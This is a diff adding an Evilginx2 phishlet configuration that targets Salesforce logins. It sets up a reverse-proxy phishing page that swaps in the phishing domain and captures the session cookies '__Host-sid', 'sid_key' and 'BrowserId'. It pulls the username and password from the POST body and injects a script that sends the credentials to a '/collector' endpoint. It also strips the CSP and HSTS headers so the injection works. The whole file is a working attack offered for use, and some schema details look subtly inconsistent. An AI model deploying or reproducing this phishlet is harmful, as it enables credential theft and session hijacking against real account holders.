@@ -1,0 +1,112 @@
+# -------------------------------------------------
+# Evilginx2 – Phishlet (spec version 2.3.0)
+# -------------------------------------------------
+# This file follows the historic 2.3.0 schema (proxy_hosts,
+# sub_filters, auth_tokens, js_inject, etc.).
+# -------------------------------------------------
+
+# -----------------------------------------------------------------
+# 0️⃣  Minimum Evilginx version required
+# -----------------------------------------------------------------
+min_ver: "2.3.0"
+
+# -----------------------------------------------------------------
+# 1️⃣  Parameters (optional – you can reference them later)
+# -----------------------------------------------------------------
+params:
+  # You can change these values without touching the rest of the file
+  target_domain: "orig"
+  phish_domain:  "phish"
+
+# -----------------------------------------------------------------
+# 2️⃣  Proxy hosts – which sub‑domains to proxy and which start a session
+# -----------------------------------------------------------------
+proxy_hosts:
+  # The login page (session starter)
+  - {phish_sub: "", orig_sub: "", domain: "{target_domain}",
+     session: true, is_landing: true}
+  # Any other sub‑domain you might need
+  - {phish_sub: "visual", orig_sub: "visual", domain: "{target_domain}",
+     session: false, is_landing: false}
+
+# -----------------------------------------------------------------
+# 3️⃣  Sub‑filters – static string replacement in HTML/JS
+# -----------------------------------------------------------------
+sub_filters:
+  # Replace every occurrence of the real domain with the phish domain
+  - {hostname: "{phish_domain}", sub: "", domain: "{target_domain}",
+     search: "{target_domain}", replace: "{phish_domain}"}
+  # Also replace the Visualforce sub‑domain if it appears
+  - {hostname: "{phish_domain}", sub: "visual", domain: "{target_domain}",
+     search: "visual.{target_domain}", replace: "visual.{phish_domain}"}
+
+# -----------------------------------------------------------------
+# 4️⃣  Auth tokens – cookies that indicate a successful login
+# -----------------------------------------------------------------
+auth_tokens:
+  - "__Host-sid"
+  - "sid_key"
+  - "BrowserId"
+
+# -----------------------------------------------------------------
+# 5️⃣  Credentials – how to extract username / password from the login form
+# -----------------------------------------------------------------
+credentials:
+  username:
+    key: "username"          # name attribute of the input field
+    search: "(.*)"           # capture everything
+    type: "post"             # taken from POST body
+  password:
+    key: "pw"                # Salesforce uses “pw” for the password field
+    search: "(.*)"
+    type: "post"
+
+# -----------------------------------------------------------------
+# 6️⃣  Optional – custom JS injection (e.g., to steal creds)
+# -----------------------------------------------------------------
+js_inject:
+  # Inline script that sends the captured credentials to our collector
+  - url: "/secur/login.jsp"
+    inline: |
+      // Simple exfiltration – runs after the user clicks “Log In”
+      document.addEventListener('submit', function(e){
+        var u = document.querySelector('[name="username"]').value;
+        var p = document.querySelector('[name="pw"]').value;
+        fetch('https://{{phish_domain}}/collector', {
+          method: 'POST',
+          mode: 'no-cors',
+          body: JSON.stringify({email:u,password:p})
+        });
+      });
+
+# -----------------------------------------------------------------
+# 7️⃣  Redirect URL – where to send the victim after we have the session
+# -----------------------------------------------------------------
+redirect_url: "https://{{phish_domain}}/success.html"
+
+# -----------------------------------------------------------------
+# 8️⃣  Optional – intercept (mock) responses (e.g., hide errors)
+# -----------------------------------------------------------------
+intercept:
+  # If Salesforce returns a “maintenance” page, replace it with a blank 200
+  - {domain: "{target_domain}", path: "^/maintenance$", http_status: 200,
+     body: "<html><body></body></html>", mime: "text/html"}
+
+# -----------------------------------------------------------------
+# 9️⃣  Optional – force POST on a GET‑only endpoint (some OAuth flows)
+# -----------------------------------------------------------------
+force_post:
+  - {domain: "{target_domain}", path: "^/secur/login$", method: "GET"}
+
+# -----------------------------------------------------------------
+# 10️⃣  Optional – custom headers (strip CSP / HSTS)
+# -----------------------------------------------------------------
+header:
+  # Remove CSP header that would block our JS injection
+  - {direction: "response", name: "Content-Security-Policy", remove: true}
+  # Remove HSTS so the browser won’t force HTTPS to the real domain
+  - {direction: "response", name: "Strict-Transport-Security", remove: true}
+
+# -------------------------------------------------
+# End of phishlet (2.3.0 format)
+# -------------------------------------------------
